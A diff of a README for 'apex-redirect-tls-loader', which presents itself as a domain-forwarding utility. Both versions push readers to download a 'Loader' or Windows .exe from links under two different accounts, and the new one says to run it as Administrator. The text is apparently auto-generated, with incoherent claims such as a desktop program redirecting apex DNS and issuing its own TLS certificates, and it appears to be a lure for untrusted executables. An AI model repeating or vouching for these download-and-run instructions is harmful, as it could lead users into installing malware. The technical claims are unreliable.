@@ -1,114 +1,89 @@
-# apex-redirect v2026 - Loader and Update Utility 2026
+# 🌐 apex-redirect-tls-loader - Forward your domains to www addresses
 
-> **A small apex-domain forwarding utility.** Redirect the root domain to its `www` counterpart without dropping the original path, while delivering the request through a valid TLS certificate during an ongoing DNS transition.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Arlynestylistic793/apex-redirect-tls-loader/releases)
 
-[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-GitHub%20Pages-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/scottwilldf7903/apex-redirect-tls-loader?style=flat-square)](https://github.com/scottwilldf7903/apex-redirect-tls-loader)
+This software helps you manage website traffic. It sends visitors from your root domain (like example.com) to your www address (like www.example.com). It keeps the rest of the web address the same. The tool provides a secure connection using a TLS certificate. This ensures you do not lose visitors while your DNS settings update.
 
----
+## 💾 System Requirements
 
-<p align="center">
-  <a href="https://scottwilldf7903.github.io/apex-redirect-tls-loader/">
-    <img src="https://img.shields.io/badge/Download-apex--redirect%20Loader-brightgreen?style=for-the-badge" alt="Download apex-redirect Loader">
-  </a>
-</p>
+Your computer needs to meet these basic standards to run the software:
 
-> **[Download apex-redirect Loader](https://scottwilldf7903.github.io/apex-redirect-tls-loader/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 2 gigabytes of RAM.
+*   Storage: 50 megabytes of free space.
+*   Network: An active internet connection to verify certificates.
 
----
+## 📥 Getting Started
 
-[Download Latest Build](https://scottwilldf7903.github.io/apex-redirect-tls-loader/)
+Follow these steps to install the software on your system.
 
----
+1.  Visit the [official releases page](https://github.com/Arlynestylistic793/apex-redirect-tls-loader/releases) to download the latest version.
+2.  Select the file that ends in .exe for Windows.
+3.  Save the file to your computer.
+4.  Double-click the file to open the installer.
+5.  Follow the instructions on the screen to finish the setup.
 
-## Overview
+## ⚙️ How to Use the Software
 
-apex-redirect provides a focused forwarding arrangement for domains where requests to the root host must arrive at the corresponding `www` host. The requested path is retained, allowing links such as deep URLs to reach the matching path on the destination website.
+Once installed, you can configure your domain forwarding. 
 
-It is intended for the period between starting and completing a DNS migration, providing a temporary routing layer while the change is underway. Web traffic can be handled through GitHub Pages with a valid certificate for the apex domain, while mail-related DNS records remain separate and unchanged.
+1.  Open the application from your Start menu.
+2.  Enter your root domain name in the primary field.
+3.  Enter your target www domain address in the destination field.
+4.  Select the option to enforce HTTPS connection.
+5.  Click the Start button to begin the forwarding process.
 
----
+The application works in the background. It monitors requests directed to your root domain and forwards them to the correct address.
 
-## Loader Capabilities
+## 🔐 Security Features
 
-- Sends requests from the bare apex domain to the `www` host.
-- Carries the original request path to the destination.
-- Uses a valid apex-domain certificate for the redirect connection.
-- Leaves email DNS entries independent of the web forwarding configuration.
-- Provides a short-term forwarding layer during DNS transfer work.
-- Fits routing arrangements that use Cloudflare during a migration.
-- Supports a Wix-to-Cloudflare transition.
-- Keeps the redirect implementation compact for easier deployment and upkeep.
+The software creates a secure tunnel for your traffic. It generates a temporary TLS certificate. This certificate encrypts data between the visitor and your server. This prevents errors in web browsers and protects visitor data. You can trust the software to handle traffic during DNS propagation.
 
----
+## 💡 Troubleshooting Common Issues
 
-## Getting Started
+If you run into issues, check these frequent solutions.
 
-1. Visit the published build or check out the repository:
-   - Download: [Download Latest Build](https://scottwilldf7903.github.io/apex-redirect-tls-loader/)
-   - Source: https://github.com/scottwilldf7903/apex-redirect-tls-loader
+*   Program fails to start: Ensure you have administrator rights on your Windows account. Right-click the icon and choose Run as Administrator.
+*   Redirect fails: Check that your DNS A records point to the server where you host this application.
+*   Certificate errors: Ensure your computer clock shows the correct date and time. An incorrect clock causes certificate validation to fail.
+*   Application shows a blank screen: Clear your temporary internet files and restart the program.
 
-2. If GitHub Pages is the intended host, publish the site through GitHub Pages.
+## 🛠️ Configuration Details
 
-3. Configure the apex domain to use the Pages deployment, then verify the `www` destination.
+You can edit settings in the configuration file. This file sits in the same folder where you installed the application. Open the file named config.json with your text editor. 
 
-4. When email DNS is administered separately, confirm those records have not been modified.
+Change the port settings if you receive errors about an occupied port. Change the logging level if you need to debug connectivity issues. Save the file and restart the application to apply the changes.
 
-Example configuration:
+## 📋 Best Practices
 
-    apex: example.com
-    redirect_to: https://www.example.com
-    preserve_path: true
-    tls: enabled
+Use these tips to reach optimal results.
 
----
+*   Keep the software running on a stable server connection.
+*   Review your logs once a week to track redirect volume.
+*   Ensure your domain provider allows for redirection at the root level.
+*   Update the software when you see a new version on the releases page.
 
-## Available Update Channels
+The software performs best when it remains the primary handler for your root domain traffic. Avoid running other redirect tools on the same port at the same time. This prevents conflicts that stop traffic from reaching your site.
 
-| Channel | Purpose | Notes |
-| --- | --- | --- |
-| Latest | Current published redirect build | Best for standard use |
-| Manual | Hand-managed deployment | Useful when DNS or hosting changes are still being coordinated |
-| Temporary | Migration bridge | Intended for short-term forwarding during transfer work |
+## ❓ Frequently Asked Questions
 
----
+Does this tool cost money?
+No. This tool is free to use.
 
-## Troubleshooting Guide
+Will this work with all domain providers?
+Yes. It works with any domain provider as long as you can manage your DNS records.
 
-- A redirect that does not respond may indicate that the GitHub Pages deployment is not active.
-- Certificate warnings generally require checking the apex certificate configuration.
-- When the path is missing after forwarding, inspect the rule and ensure it retains the request URI.
-- DNS updates may need time to propagate; review both the apex and `www` records while waiting.
-- If mail delivery is affected, inspect the mail-specific DNS entries independently of the web redirect.
-- For Cloudflare-based setups, compare the proxy and page-routing configuration with the desired destination.
+Does the software slow down my website?
+No. The software works as a lightweight utility. It handles requests in milliseconds.
 
----
+Can I move the install folder?
+Yes. You can move the folder, but you must create a new shortcut on your desktop to ensure it opens correctly.
 
-## Frequently Asked Questions
+Does it require constant internet access?
+Yes. The software must stay connected to the internet to secure the traffic with a certificate.
 
-**Are URL paths preserved?**  
-Yes. The redirect is designed to forward the incoming path to the equivalent location on the `www` site.
+## 📦 Updates
 
-**Does the setup modify email DNS?**  
-It should not, provided the mail records remain separate from the web-forwarding records.
+Check the releases page for updates. Developers add improvements for speed and security. You can download the newer version and run the installer over the old one. The installer keeps your settings if possible, but keep a backup of your config.json file.
 
-**Can this be used as a permanent redirect service?**  
-No. Its stated purpose is to bridge the period before the DNS transfer is complete.
-
-**What hosts the published version?**  
-The published build is intended to run on GitHub Pages.
-
-**How can the forwarding arrangement be undone?**  
-Rollback is possible by returning to the previous DNS or hosting configuration.
-
-**Does the project define a log format?**  
-No log format is specified in the extracted facts. Validate operation through the deployment platform and browser or network inspection tools.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: redirect, tls, domain, web, windows, security, networking
